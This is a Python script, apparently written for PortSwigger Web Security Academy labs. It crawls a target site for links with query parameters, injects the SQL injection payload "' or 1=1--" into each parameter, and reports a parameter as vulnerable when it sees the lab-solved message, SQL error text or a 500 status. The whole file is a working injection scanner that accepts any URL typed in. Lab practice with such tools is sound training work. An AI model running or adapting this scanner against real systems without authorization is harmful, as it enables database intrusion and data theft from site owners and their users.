#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

PAYLOAD = "' or 1=1--"
SIG_LAB_SOLVED = "Congratulations, you solved the lab!"

sess = requests.Session()
sess.headers.update({"User-Agent": "simple-portswigger-sqli-scanner/1.0"})

def same_domain(u, base_netloc):
    try:
        return urlparse(u).netloc == base_netloc
    except:
        return False

def gather_param_urls(base):
    try:
        r = sess.get(base, timeout=8)
        r.raise_for_status()
    except Exception as e:
        print(f"[!] Failed to fetch base page: {e}")
        return []
    soup = BeautifulSoup(r.text, "html.parser")
    base_netloc = urlparse(base).netloc
    urls = set()
    # include base if it has query params
    if urlparse(base).query:
        urls.add(base)
    for a in soup.find_all("a", href=True):
        full = urljoin(base, a["href"])
        if same_domain(full, base_netloc) and urlparse(full).query:
            urls.add(full)
    return list(urls)

def looks_like_sqli(resp):
    if resp is None:
        return False
    body = resp.text.lower()
    errors = ("sql", "syntax", "mysql", "sqlite", "oracle", "sql error", "warning", "query failed")
    if resp.status_code == 500:
        return True
    return any(e in body for e in errors)

def test_url(u, results):
    parsed = urlparse(u)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return
    print(f"\n[+] Testing: {u}")
    for param in list(qs.keys()):
        # prepare test query with payload injected into single param
        test_qs = {k: (PAYLOAD if k == param else v[0]) for k, v in qs.items()}
        new_query = urlencode(test_qs, doseq=False)
        test_parsed = parsed._replace(query=new_query)
        test_url = urlunparse(test_parsed)
        try:
            r = sess.get(test_url, timeout=8)
        except Exception as e:
            print(f" - {param}: request failed ({e})")
            continue

        # Check for exact lab "solved" string first
        if SIG_LAB_SOLVED in r.text:
            print(f" - {param}: VULNERABLE (lab solved message found!)")
            results.append((test_url, param, "lab_solved"))
            continue

        # Check for SQL errors / 500
        if looks_like_sqli(r):
            print(f" - {param}: POSSIBLE SQLi (status {r.status_code})")
            results.append((test_url, param, "possible_sqli"))
        else:
            print(f" - {param}: status {r.status_code}")

def main():
    base = input("Target base URL (e.g. https://abc.web-security-academy.net): ").strip()
    if not base:
        print("No URL provided. Exiting.")
        return

    print("[*] Gathering parameterized URLs (base + first-level links)...")
    targets = gather_param_urls(base)
    if not targets:
        print("No parameterized URLs found on the base page or its first-level links.")
        return

    vulnerable = []
    for t in targets:
        test_url(t, vulnerable)

    print("\n=== SUMMARY ===")
    if not vulnerable:
        print("No vulnerable parameters detected by this quick scan.")
    else:
        for url, param, kind in vulnerable:
            note = "LAB SOLVED" if kind == "lab_solved" else "POSSIBLE SQLi"
            print(f" - {url}  -> param: {param}  => {note}")

    print("\nDone.")

if __name__ == "__main__":
    main()
